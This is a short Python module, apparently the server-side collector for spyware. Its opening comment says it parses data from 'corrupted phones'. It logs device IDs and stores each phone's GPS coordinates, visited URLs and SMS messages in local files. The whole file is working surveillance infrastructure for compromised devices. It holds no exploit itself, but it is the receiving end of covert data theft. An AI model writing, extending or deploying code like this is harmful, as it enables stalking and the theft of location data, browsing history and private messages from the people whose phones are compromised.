# parse the data received from the corrupted phones


#------------- receive and sort packets ----------------

def receive_packet(addr, data):
    new_data = data.decode('utf-8')
    id = new_data.split(",")[0]
    if not is_id_already_in_file(id, "id.txt"):
        with open('../data/id.txt', 'a') as file:
            file.write(id+"\n")

    process_packet_type(new_data)


def is_id_already_in_file(new_id, filename):
    with open('../data/'+filename, 'r') as file:
        for id in file:
            if new_id+"\n" == id:
                return True

    return False


def process_packet_type(new_data):
    
    data = new_data.split(",")[1:]
    id = new_data.split(",")[0]
    print(data)
    packet_type = data[0].split()[0]

    if packet_type == "gps" :
        process_gps(new_data)
    elif packet_type == "url" :
        process_url(new_data)
    elif packet_type == "sms" :
        process_sms(id, new_data)
    else:
        print("autre")


#-------------- manage gps location packets -------------------

def is_too_close(new_data, line):
    new_lat, new_long = get_loc_from_line(new_data)
    old_lat, old_long = get_loc_from_line(line)

    return abs(new_lat - old_lat) < 0.001 and abs(new_long - old_long) < 0.001
    


def get_loc_from_line(line):
    start_index = line.find("(")
    end_index = line.find(")")

    coordinates_str = line[start_index + 1:end_index]
    latitude_str, longitude_str = coordinates_str.split(":")

    latitude = float(latitude_str.strip())
    longitude = float(longitude_str.strip())

    return latitude, longitude


def process_gps(new_data):
    already_here = False
    id = new_data.split(",")[0]
    with open('../data/gps.txt', 'r') as file:
        lines = file.readlines()
        for i in range(len(lines)):
            ids = lines[i].split(",")[0]
            if ids == id and is_too_close(new_data, lines[i]):
                lines[i] = new_data + "\n"
                already_here = True
                       
    if already_here : 
        with open('../data/gps.txt', 'w') as file:
            file.writelines(lines)
    else :
        with open('../data/gps.txt', 'a') as file:
            file.write(new_data + "\n")


           
#------------- manage other packet types ----------------------

def process_url(new_data):
    with open('../data/url.txt', 'a') as file:
        file.write(new_data + "\n")


def process_sms(id, new_data):
    with open('../data/sms/sms_'+id+'.txt', 'w') as file:
        file.write(new_data + "\n")